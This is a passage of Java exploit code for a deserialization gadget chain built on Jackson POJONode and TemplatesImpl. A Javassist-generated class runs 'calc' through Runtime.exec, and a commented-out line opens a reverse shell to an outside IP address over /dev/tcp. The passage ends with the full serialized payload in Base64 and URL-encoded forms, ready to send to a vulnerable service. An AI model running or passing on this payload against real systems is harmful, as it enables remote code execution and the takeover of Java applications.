returnbaos.toByteArray(); } public static void unserialize(byte[] string) throws Exception { ByteArrayInputStream bais = new ByteArrayInputStream(string); ObjectInputStream obji = new ObjectInputStream(bais); obji.readObject(); obji.close(); } public static void setFieldValue(Object obj, String fieldName, Object value) throws Exception { Field field = obj.getClass().getDeclaredField(fieldName); field.setAccessible(true); field.set(obj, value); } public static byte[][] generateEvilBytes() throws Exception { ClassPool cp = ClassPool.getDefault(); cp.insertClassPath(new ClassClassPath(AbstractTranslet.class)); CtClass cc = cp.makeClass("evil"); String cmd ="java.lang.Runtime.getRuntime().exec("calc");"; // String cmd ="java.lang.Runtime.getRuntime().exec("sh -i >& /dev/tcp/154.201.70.35/8080 0>&1");"; cc.makeClassInitializer().insertBefore(cmd); cc.setSuperclass(cp.get(AbstractTranslet.class.getName())); returnnew byte[][]{cc.toBytecode()}; } public static <T> void setValue(Object obj, String fname, T f) throws Exception { Field filed = TemplatesImpl.class.getDeclaredField(fname); filed.setAccessible(true); filed.set(obj, f); }}// Base64 Payload:// rO0ABXNyABFqYXZhLnV0aWwuSGFzaE1hcAUH2sHDFmDRAwACRgAKbG9hZEZhY3RvckkACXRocmVzaG9sZHhwP0AAAAAAAAx3CAAAABAAAAACc3IAOGNvbS5mYXN0ZXJ4bWwuamFja3Nvbi5hbm5vdGF0aW9uLk9iamVjdElkR2VuZXJhdG9yJElkS2V5AAAAAAAAAAECAARJAAhoYXNoQ29kZUwAA2tleXQAEkxqYXZhL2xhbmcvT2JqZWN0O0wABXNjb3BldAARTGphdmEvbGFuZy9DbGFzcztMAAR0eXBlcQB+AAR4cAAAAABzcgAxY29tLnN1bi5vcmcuYXBhY2hlLnhwYXRoLmludGVybmFsLm9iamVjdHMuWFN0cmluZxwKJztIFsX9AgAAeHIAMWNvbS5zdW4ub3JnLmFwYWNoZS54cGF0aC5pbnRlcm5hbC5vYmplY3RzLlhPYmplY3T0mBIJu3u2GQIAAUwABW1fb2JqcQB+AAN4cgAsY29tLnN1bi5vcmcuYXBhY2hlLnhwYXRoLmludGVybmFsLkV4cHJlc3Npb24H2aYcjays1gIAAUwACG1fcGFyZW50dAAyTGNvbS9zdW4vb3JnL2FwYWNoZS94cGF0aC9pbnRlcm5hbC9FeHByZXNzaW9uTm9kZTt4cHB0AAB2cgAQamF2YS5sYW5nLk9iamVjdAAAAAAAAAAAAAAAeHBxAH4ADXQAAXhzcQB+AAIAAAAAc3IALGNvbS5mYXN0ZXJ4bWwuamFja3Nvbi5kYXRhYmluZC5ub2RlLlBPSk9Ob2RlAAAAAAAAAAICAAFMAAZfdmFsdWVxAH4AA3hyAC1jb20uZmFzdGVyeG1sLmphY2tzb24uZGF0YWJpbmQubm9kZS5WYWx1ZU5vZGUAAAAAAAAAAQIAAHhyADBjb20uZmFzdGVyeG1sLmphY2tzb24uZGF0YWJpbmQubm9kZS5CYXNlSnNvbk5vZGUAAAAAAAAAAQIAAHhwc3IAOmNvbS5zdW4ub3JnLmFwYWNoZS54YWxhbi5pbnRlcm5hbC54c2x0Yy50cmF4LlRlbXBsYXRlc0ltcGwJV0/BbqyrMwMABkkADV9pbmRlbnROdW1iZXJJAA5fdHJhbnNsZXRJbmRleFsACl9ieXRlY29kZXN0AANbW0JbAAZfY2xhc3N0ABJbTGphdmEvbGFuZy9DbGFzcztMAAVfbmFtZXQAEkxqYXZhL2xhbmcvU3RyaW5nO0wAEV9vdXRwdXRQcm9wZXJ0aWVzdAAWTGphdmEvdXRpbC9Qcm9wZXJ0aWVzO3hwAAAAAP////91cgADW1tCS/0ZFWdn2zcCAAB4cAAAAAF1cgACW0Ks8xf4BghU4AIAAHhwAAABmMr+ur4AAAA0ABsBAARldmlsBwABAQAQamF2YS9sYW5nL09iamVjdAcAAwEAClNvdXJjZUZpbGUBAAlldmlsLmphdmEBAAg8Y2xpbml0PgEAAygpVgEABENvZGUBABFqYXZhL2xhbmcvUnVudGltZQcACgEACmdldFJ1bnRpbWUBABUoKUxqYXZhL2xhbmcvUnVudGltZTsMAAwADQoACwAOAQAEY2FsYwgAEAEABGV4ZWMBACcoTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvUHJvY2VzczsMABIAEwoACwAUAQBAY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL3J1bnRpbWUvQWJzdHJhY3RUcmFuc2xldAcAFgEABjxpbml0PgwAGAAICgAXABkAIQACABcAAAAAAAIACAAHAAgAAQAJAAAAFgACAAAAAAAKuAAPEhG2ABVXsQAAAAAAAQAYAAgAAQAJAAAAEQABAAEAAAAFKrcAGrEAAAAAAAEABQAAAAIABnB0AAdQaGFudG9tcHcBAHhxAH4ADXEAfgANdAABYXg=// URL Encoded Payload:// rO0ABXNyABFqYXZhLnV0aWwuSGFzaE1hcAUH2sHDFmDRAwACRgAKbG9hZEZhY3RvckkACXRocmVzaG9sZHhwP0AAAAAAAAx3CAAAABAAAAACc3IAOGNvbS5mYXN0ZXJ4bWwuamFja3Nvbi5hbm5vdGF0aW9uLk9iamVjdElkR2VuZXJhdG9yJElkS2V5AAAAAAAAAAECAARJAAhoYXNoQ29kZUwAA2tleXQAEkxqYXZhL2xhbmcvT2JqZWN0O0wABXNjb3BldAARTGphdmEvbGFuZy9DbGFzcztMAAR0eXBlcQB%2BAAR4cAAAAABzcgAxY29tLnN1bi5vcmcuYXBhY2hlLnhwYXRoLmludGVybmFsLm9iamVjdHMuWFN0cmluZxwKJztIFsX9AgAAeHIAMWNvbS5zdW4ub3JnLmFwYWNoZS54cGF0aC5pbnRlcm5hbC5vYmplY3RzLlhPYmplY3T0mBIJu3u2GQIAAUwABW1fb2JqcQB%2BAAN4cgAsY29tLnN1bi5vcmcuYXBhY2hlLnhwYXRoLmludGVybmFsLkV4cHJlc3Npb24H2aYcjays1gIAAUwACG1fcGFyZW50dAAyTGNvbS9zdW4vb3JnL2FwYWNoZS94cGF0aC9pbnRlcm5hbC9FeHByZXNzaW9uTm9kZTt4cHB0AAB2cgAQamF2YS5sYW5nLk9iamVjdAAAAAAAAAAAAAAAeHBxAH4ADXQAAXhzcQB%2BAAIAAAAAc3IALGNvbS5mYXN0ZXJ4bWwuamFja3Nvbi5kYXRhYmluZC5ub2RlLlBPSk9Ob2RlAAAAAAAAAAICAAFMAAZfdmFsdWVxAH4AA3hyAC1jb20uZmFzdGVyeG1sLmphY2tzb24uZGF0YWJpbmQubm9kZS5WYWx1ZU5vZGUAAAAAAAAAAQIAAHhyADBjb20uZmFzdGVyeG1sLmphY2tzb24uZGF0YWJpbmQubm9kZS5CYXNlSnNvbk5vZGUAAAAAAAAAAQIAAHhwc3IAOmNvbS5zdW4ub3JnLmFwYWNoZS54YWxhbi5pbnRlcm5hbC54c2x0Yy50cmF4LlRlbXBsYXRlc0ltcGwJV0%2FBbqyrMwMABkkADV9pbmRlbnROdW1iZXJJAA5fdHJhbnNsZXRJbmRleFsACl9ieXRlY29kZXN0AANbW0JbAAZfY2xhc3N0ABJbTGphdmEvbGFuZy9DbGFzcztMAAVfbmFtZXQAEkxqYXZhL2xhbmcvU3RyaW5nO0wAEV9vdXRwdXRQcm9wZXJ0aWVzdAAWTGphdmEvdXRpbC9Qcm9wZXJ0aWVzO3hwAAAAAP%2F%2F%2F%2F91cgADW1tCS%2F0ZFWdn2zcCAAB4cAAAAAF1cgACW0Ks8xf4BghU4AIAAHhwAAABmMr%2Bur4AAAA0ABsBAARldmlsBwABAQAQamF2YS9sYW5nL09iamVjdAcAAwEAClNvdXJjZUZpbGUBAAlldmlsLmphdmEBAAg8Y2xpbml0PgEAAygpVgEABENvZGUBABFqYXZhL2xhbmcvUnVudGltZQcACgEACmdldFJ1bnRpbWUBABUoKUxqYXZhL2xhbmcvUnVudGltZTsMAAwADQoACwAOAQAEY2FsYwgAEAEABGV4ZWMBACcoTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvUHJvY2VzczsMABIAEwoACwAUAQBAY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL3J1bnRpbWUvQWJzdHJhY3RUcmFuc2xldAcAFgEABjxpbml0PgwAGAAICgAXABkAIQACABcAAAAAAAIACAAHAAgAAQAJAAAAFgACAAAAAAAKuAAPEhG2ABVXsQAAAAAAAQAYAAgAAQAJAAAAEQABAAEAAAAFKrcAGrEAAAAAAAEABQAAAAIABnB0AAdQaGFudG9tcHcBAHhxAH4ADXEAfgANdAABYXg%3D
 ```
 
 
